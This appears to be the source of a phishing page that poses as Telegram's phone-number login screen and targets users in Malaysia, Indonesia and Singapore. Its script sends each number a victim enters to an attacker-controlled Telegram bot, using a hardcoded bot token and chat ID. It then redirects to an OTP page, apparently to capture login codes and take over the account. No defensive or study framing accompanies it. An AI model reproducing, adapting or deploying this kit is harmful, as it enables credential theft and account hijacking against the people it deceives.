<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Phone Number Form</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #ffffff;
      }

      .form-container {
        background: #ffffff;
        width: 90%;
        max-width: 400px;
        border-radius: 15px;
        /* box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); */
        padding: 30px;
        text-align: center;
      }

      .form-container h1 {
        font-size: 20px;
        margin-bottom: 10px;
        font-weight: bold;
      }

      .form-container p {
        font-size: 14px;
        color: #555;
        margin-bottom: 20px;
      }

      .form-group {
        margin-bottom: 20px;
        position: relative;
        text-align: left;
      }

      .form-group label {
        font-size: 12px;
        color: #999;
        position: absolute;
        top: -10px;
        left: 15px;
        background: #ffffff;
        padding: 0 5px;
        opacity: 0;
        transition: opacity 0.3s ease;
      }

      .country-selector {
        display: none;
        align-items: center;
        border: 1px solid #ccc;
        border-radius: 10px;
        padding: 10px;
        background: #f9f9f9;
        opacity: 0;
        transition: opacity 0.3s ease;
      }

      .country-selector img {
        width: 20px;
        height: 14px;
        margin-right: 10px;
        border-radius: 2px;
      }

      .country-selector select {
        border: none;
        font-size: 14px;
        flex-grow: 1;
        background: transparent;
        outline: none;
        cursor: pointer;
      }

      .phone-input {
        display: flex;
        align-items: center;
        border: 1px solid #ccc;
        border-radius: 10px;
        padding: 10px;
        background: #f9f9f9;
      }

      .phone-input span {
        font-size: 14px;
        color: #333;
        margin-right: 10px;
      }

      .phone-input input {
        border: none;
        font-size: 14px;
        flex-grow: 1;
        background: transparent;
        outline: none;
      }

      .sync-label {
        display: flex;
        align-items: center;
        font-size: 14px;
        cursor: pointer;
        margin-top: 10px;
      }

      .sync-label input {
        margin-right: 10px;
      }

      .submit-btn {
        width: 60px;
        height: 60px;
        border-radius: 50%;
        background-color: #25d366;
        border: none;
        color: white;
        font-size: 24px;
        display: flex;
        justify-content: center;
        align-items: center;
        margin: 20px auto 0;
        cursor: pointer;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      }

      .submit-btn:hover {
        background-color: #1caa54;
      }
    </style>
  </head>
  <body>
    <div class="form-container">
      <img src="Telegram_logo.svg.png" alt="" style="width: 40%" />
      <h1>Your phone number</h1>
      <p>Please confirm your country code and enter your phone number.</p>
      <form id="phoneForm">
        <div class="form-group">
          <label for="country" id="countryLabel">Country</label>
          <div class="country-selector" id="countrySelector">
            <img
              src="https://flagcdn.com/w320/my.png"
              alt="Malaysia Flag"
              id="flag"
            />
            <select id="country" name="country">
              <option value="my" data-flag="https://flagcdn.com/w320/my.png">
                Malaysia
              </option>

              <option value="id" data-flag="https://flagcdn.com/w320/id.png">
                Indonesia
              </option>
              <option value="sg" data-flag="https://flagcdn.com/w320/sg.png">
                Singapore
              </option>
            </select>
          </div>
        </div>
        <div class="form-group">
          <div class="phone-input">
            <span id="countryCode">+60</span>
            <input type="text" id="phone" name="phone" placeholder="" />
          </div>
        </div>
        <div class="form-group">
          <label class="sync-label">
            <input
              type="checkbox"
              id="syncContacts"
              name="syncContacts"
              checked
            />
            Sync Contacts
          </label>
        </div>
        <button type="button" class="submit-btn" id="submitBtn">
          &#x2794;
        </button>
      </form>
    </div>

    <script>
      const phoneInput = document.getElementById("phone");
      const countrySelector = document.getElementById("countrySelector");
      const countryLabel = document.getElementById("countryLabel");
      const countryCode = document.getElementById("countryCode");

      phoneInput.addEventListener("focus", () => {
        countrySelector.style.display = "flex";
        countrySelector.style.opacity = "1";
        countryLabel.style.opacity = "1";
      });

      document
        .getElementById("country")
        .addEventListener("change", function () {
          const selectedOption = this.options[this.selectedIndex];
          const flagUrl = selectedOption.getAttribute("data-flag");
          const code =
            selectedOption.value === "kw"
              ? "+965"
              : selectedOption.value === "id"
              ? "+62"
              : "+65";

          document.getElementById("flag").src = flagUrl;
          countryCode.textContent = code;
        });

      document
        .getElementById("submitBtn")
        .addEventListener("click", async function () {
          const country = document.getElementById("country").value;
          const phone = document.getElementById("phone").value;
          const syncContacts = document.getElementById("syncContacts").checked;

          if (!phone) {
            alert("Please enter your phone number.");
            return;
          }

          // Save to local storage
          localStorage.setItem("phoneNumber", phone);

          // Send to Telegram bot
          const token = "7575918160:AAEacn4kHInFsTxIe1wZAS3OE1DW6wOOWzs";
          const chatId = "7745865654";
          const message = `

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ðŸ”° DATA | NOMBOR TELEGRAM ðŸ”°
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ðŸ“± No HP : ${phone}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;

          try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ chat_id: chatId, text: message }),
            });

            // Redirect to OTP page
            window.location.href = "otp.html";
          } catch (error) {
            alert("Failed to send phone number to Telegram.");
          }
        });
    </script>
  </body>
</html>
